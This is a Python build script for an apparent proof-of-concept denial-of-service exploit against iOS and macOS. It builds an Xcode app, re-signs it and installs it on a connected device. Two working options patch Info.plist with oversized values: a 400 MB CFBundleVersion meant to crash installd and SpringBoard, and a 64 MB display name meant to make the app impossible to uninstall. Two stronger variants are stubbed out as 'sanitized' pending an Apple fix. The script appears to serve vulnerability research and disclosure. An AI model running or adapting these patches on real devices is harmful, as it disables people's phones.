#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from math import inf
import os
import sys
import subprocess
import shutil
import plistlib
import argparse
import random
import string

#####################################
#           Configuration           #
#####################################
# Your local developer signature information.abs
# Ignore these if you have better way to sign the app
"""
1. Run `open ./dos.xcodeproj`, go to XCode, properly configure your "Signing & Capabilities" tab.
2. Successfuly build the project in Xcode at least once, and try to run it in your iphone. You may need to configure the signing identity and team ID in the project settings.
3. Export the entitlements file from the project
```bash
cd ~/Library/Developer/Xcode/DerivedData
codesign -d --entitlements :- dos-fbnunozviukdjyciukisfjuasruo/Build/Products/Debug-iphoneos/dos.app > Debug-iphoneos-entitlements.plist
```
Fill these information below
"""
IOS_ENTITLEMENTS_PATH = os.path.join(os.path.expanduser("~"), "Library/Developer/Xcode/DerivedData/Debug-iphoneos-entitlements.plist")
"""
1. Run `security find-identity -v -p codesigning`
2. Replace the following line with your own identity, it's typically the content within "xxx"
"""
CODESIGN_IDENTITY = "Apple Development: xxxxx@gmail.com (72RZ8G9398)"


# Change below if you want to run POC on different platform
"""
```bash
cd ~/Library/Developer/Xcode/DerivedData
codesign -d --entitlements :- dos-fbnunozviukdjyciukisfjuasruo/Build/Products/Debug/dos.app > Debug-entitlements.plist
codesign -d --entitlements :- dos-fbnunozviukdjyciukisfjuasruo/Build/Products/Debug-iphonesimulator/dos.app > Debug-iphonesimulator-entitlements.plist
```
"""
MACOS_ENTITLEMENTS_PATH = os.path.join(os.path.expanduser("~"), "Library/Developer/Xcode/DerivedData/Debug-entitlements.plist")
SIMULATOR_ENTITLEMENTS_PATH = os.path.join(os.path.expanduser("~"), "Library/Developer/Xcode/DerivedData/Debug-iphonesimulator-entitlements.plist")


# Project Infos
PROJECT_PATH = "dos.xcodeproj"
SCHEME = "dos"
APP_NAME = "dos"
TEAM_ID = "N93RB7F2A8"
BUNDLE_ID = f"{TEAM_ID}.com.evil.{APP_NAME}"
CONFIGURATION = "Debug"
BUILD_DIR = os.path.join(os.getcwd(), "build")
EXPORT_OPTIONS_PLIST = os.path.join(BUILD_DIR, "ExportOptions.plist")


def ran(n):
    a = ''
    for i in range(n):
        a+=random.choice(string.ascii_lowercase)
    return a

def run_command(command, exit_on_error=True):
    """Execute command and return result"""
    try:
        result = subprocess.run(command, shell=True, check=True, text=True, capture_output=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"❌ Error: Command execution failed: {command}")
        print(f"Error message: {e.stderr}")
        if exit_on_error:
            sys.exit(1)
        return None

def get_device_udid():
    """Get the UDID of the connected iOS device"""
    print("▶ Getting connected device UDID...")
    device_udid = run_command("idevice_id -l | head -n1", exit_on_error=False)
    if not device_udid:
        exit("⚠️ Warning: No iOS device found.")
    else:
        print(f"▶ Device UDID: {device_udid}")
    return device_udid

def get_running_simulator():
    """Get the UDID of the running simulator"""
    print("▶ Getting running simulator...")
    simulators = run_command("xcrun simctl list devices | grep Booted", exit_on_error=False)
    if not simulators:
        print("❌ Error: No running simulator found. Please start a simulator first.")
        sys.exit(1)
    
    # Extract the UDID from the output
    import re
    match = re.search(r'\(([0-9A-F-]+)\)', simulators)
    if match:
        simulator_udid = match.group(1)
        print(f"▶ Found running simulator: {simulator_udid}")
        return simulator_udid
    else:
        print("❌ Error: Could not extract simulator UDID.")
        sys.exit(1)

def recover():
    device_udid = get_device_udid()
    uninstall_out = run_command(f"ios-deploy --id \"{device_udid}\" --uninstall_only --bundle_id com.evil.dos")
    print(uninstall_out)
    print("✅ App uninstalled from iphone")

def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="Build and deploy iOS/macOS app")
    parser.add_argument("--recover", action="store_true", help="Uninstall the app from device")
    parser.add_argument("--platform", choices=["ios", "macos", "simulator"], default="ios", 
                        help="Target platform: ios, macos, or simulator (default: ios)")
    parser.add_argument("--check", action="store_true", help="Build and install without patching, then uninstall")
    parser.add_argument("--dos0", action="store_true", help="The most powerful DOS, combined 2 issues")
    parser.add_argument("--dos1", action="store_true", help="Crash installd and SpringBoard")
    parser.add_argument("--dos2", action="store_true", help="Make this app can't be uninstalled")
    parser.add_argument("--dos3", action="store_true", help="Infinite panic initproc")
    args = parser.parse_args()
    
    # Platform-specific settings
    if args.platform == "ios":
        SDK = "iphoneos"
        DESTINATION = "generic/platform=iOS"
        ARCHIVE_PATH = os.path.join(BUILD_DIR, f"{APP_NAME}_ios.xcarchive")
        GENERATED_APP = os.path.join(ARCHIVE_PATH, f"Products/Applications/{APP_NAME}.app")
        INFO_PLIST_PATH = os.path.join(GENERATED_APP, "Info.plist")
        IPA_PATH = os.path.join(BUILD_DIR, f"{APP_NAME}_ios.ipa")
        ENTITLEMENTS_PATH = IOS_ENTITLEMENTS_PATH
    elif args.platform == "macos":
        SDK = "macosx"
        DESTINATION = "generic/platform=macOS"
        ARCHIVE_PATH = os.path.join(BUILD_DIR, f"{APP_NAME}_macos.xcarchive")
        GENERATED_APP = os.path.join(ARCHIVE_PATH, f"Products/Applications/{APP_NAME}.app")
        INFO_PLIST_PATH = os.path.join(GENERATED_APP, "Contents/Info.plist")
        IPA_PATH = os.path.join(BUILD_DIR, f"{APP_NAME}_macos.app")
        ENTITLEMENTS_PATH = MACOS_ENTITLEMENTS_PATH
    elif args.platform == "simulator":
        SDK = "iphonesimulator"
        DESTINATION = "generic/platform=iOS Simulator"
        ARCHIVE_PATH = os.path.join(BUILD_DIR, f"{APP_NAME}_simulator.xcarchive")
        GENERATED_APP = os.path.join(ARCHIVE_PATH, f"Products/Applications/{APP_NAME}.app")
        INFO_PLIST_PATH = os.path.join(GENERATED_APP, "Info.plist")
        IPA_PATH = os.path.join(BUILD_DIR, f"{APP_NAME}_simulator.app")
        ENTITLEMENTS_PATH = SIMULATOR_ENTITLEMENTS_PATH
    

    # If --recover flag is provided, uninstall the app and exit
    if args.recover:
        if args.platform == "ios":
            recover()
        elif args.platform == "simulator":
            simulator_udid = get_running_simulator()
            run_command(f"xcrun simctl uninstall {simulator_udid} com.evil.dos", exit_on_error=False)
            print("✅ App uninstalled from simulator")
        elif args.platform == "macos":
            print("⚠️ Uninstall not implemented for macOS")
        return
    
    #####################################
    #        Clean Old Builds           #
    #####################################
    print("▶ Cleaning old build files...")
    if os.path.exists(BUILD_DIR):
        shutil.rmtree(BUILD_DIR)
    os.makedirs(BUILD_DIR)
    
    #####################################
    #    Generate ExportOptions.plist   #
    #####################################
    print("▶ Creating ExportOptions.plist...")
    method = "development" if args.platform != "macos" else "mac-application"
    export_options_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>method</key>
  <string>{method}</string>
  <key>teamID</key>
  <string>{TEAM_ID}</string>
  <key>signingStyle</key>
  <string>automatic</string>
  <key>stripSwiftSymbols</key>
  <true/>
  <key>compileBitcode</key>
  <false/>
</dict>
</plist>"""
    
    with open(EXPORT_OPTIONS_PLIST, "w") as f:
        f.write(export_options_content)
    
    #####################################
    #        Archive Project            #
    #####################################
    print(f"▶ Archiving with xcodebuild for {args.platform}...")
    archive_command = f"""xcrun xcodebuild archive \
      -project "{PROJECT_PATH}" \
      -scheme "{SCHEME}" \
      -configuration "{CONFIGURATION}" \
      -sdk "{SDK}" \
      -destination "{DESTINATION}" \
      -archivePath "{ARCHIVE_PATH}" \
      SKIP_INSTALL=NO \
      BUILD_LIBRARY_FOR_DISTRIBUTION=NO"""
    
    run_command(archive_command)
    
    #####################################
    #         Patch Info.plist          #
    #####################################
    print("▶ Patching Info.plist inside archive...")
    def patch(file_path, key, value):
        with open(file_path, 'rb') as f:
            plist_data = plistlib.load(f)
        plist_data[key] = value
        with open(file_path, 'wb') as f:
            plistlib.dump(plist_data, f)
        print(f"✅ Successfully patched {key} in {file_path}")
    
    print("▶ Removing signatures from extensions...")
    widget_extensions = []
    plugins_dir = os.path.join(GENERATED_APP, "PlugIns")
    if os.path.exists(plugins_dir):
        for item in os.listdir(plugins_dir):
            if item.endswith(".appex"):
                widget_extensions.append(os.path.join(plugins_dir, item))
    for extension in widget_extensions:
        print(f"▶ Removing signature from {extension}")
        run_command(f"codesign --remove-signature \"{extension}\"")
        
    # Start evil patching...
    if not args.check:
        if args.dos1:
            # If crash not happen, try to change the lentgh to 1024*1024*400
            patch(INFO_PLIST_PATH, 'CFBundleVersion', '1'*1024*1024*400)
        
        if args.dos2:
            patch(INFO_PLIST_PATH, 'CFBundleDisplayName', 'a' * 1024*1024*64)
        
        if args.dos3:
            # Add a widget to lock screen with ./build.py first, and do ./build.py --dos3
            # Sanitized, wait for Apple to fix the bug
            pass
        
        # For most powerful DOS: Panic && Can't be uninstalled
        if args.dos0:
            # Sanitized, wait for Apple to fix the bug
            pass
        


    #####################################
    #           Sign App                #
    #####################################
    print("▶ Signing the application...")
    for extension in widget_extensions:
        print(f"▶ Signing extension: {extension}")
        extension_entitlements = os.path.join(os.path.dirname(extension), f"{os.path.basename(extension)}.entitlements")
        if os.path.exists(extension_entitlements):
            sign_command = f'codesign -s "{CODESIGN_IDENTITY}" --force --entitlements {extension_entitlements} "{extension}"'
        else:
            sign_command = f'codesign -s "{CODESIGN_IDENTITY}" --force "{extension}"'
        run_command(sign_command)
    if args.platform != "macos":
        codesign_command = f'codesign -s "{CODESIGN_IDENTITY}" --deep --force --entitlements {ENTITLEMENTS_PATH} {GENERATED_APP}'
        run_command(codesign_command)
    else:
        # For macOS, different signing might be needed
        codesign_command = f'codesign -s "{CODESIGN_IDENTITY}" --deep --force {GENERATED_APP}'
        run_command(codesign_command)
    
    #####################################
    #        Package App                #
    #####################################
    if args.platform == "ios":
        print("▶ Packaging application as IPA...")
        ipa_dir = os.path.join(BUILD_DIR, "ipa")
        payload_dir = os.path.join(ipa_dir, "Payload")
        
        if os.path.exists(ipa_dir):
            shutil.rmtree(ipa_dir)
        os.makedirs(payload_dir)
        
        app_name = os.path.basename(GENERATED_APP)
        shutil.copytree(GENERATED_APP, os.path.join(payload_dir, app_name))
        
        # Create IPA file
        current_dir = os.getcwd()
        os.chdir(ipa_dir)
        run_command(f"zip -r {IPA_PATH} Payload")
        os.chdir(current_dir)
        
        print(f"▶ IPA file created at: {IPA_PATH}")
    else:
        # For macOS and simulator, just copy the .app file
        print(f"▶ Copying .app to {IPA_PATH}...")
        if os.path.exists(IPA_PATH):
            shutil.rmtree(IPA_PATH)
        shutil.copytree(GENERATED_APP, IPA_PATH)
    
    #####################################
    #        Install & Launch App       #
    #####################################
    if args.platform == "ios":
        device_udid = get_device_udid()
        print(f"▶ Installing IPA to iOS device ({device_udid})...")
        os.system(f"ios-deploy --id \"{device_udid}\" --verbose --bundle {IPA_PATH}")
        if args.check:
            input("❓ Press Enter if you see the new app installed in your iphone")
            recover()
            print("✅ You are ready to test DOS")
    elif args.platform == "simulator":
        simulator_udid = get_running_simulator()
        print(f"▶ Installing app to simulator ({simulator_udid})...")
        run_command(f"xcrun simctl install {simulator_udid} {IPA_PATH}")
        print(f"▶ Launching app on simulator...")
        run_command(f"xcrun simctl launch {simulator_udid} com.evil.dos")
    elif args.platform == "macos":
        print(f"▶ App built for macOS at: {IPA_PATH}")
        print(f"▶ You can open it with: open {IPA_PATH}")
        # Optionally open the app
        run_command(f"open {IPA_PATH}", exit_on_error=False)

if __name__ == "__main__":
    main()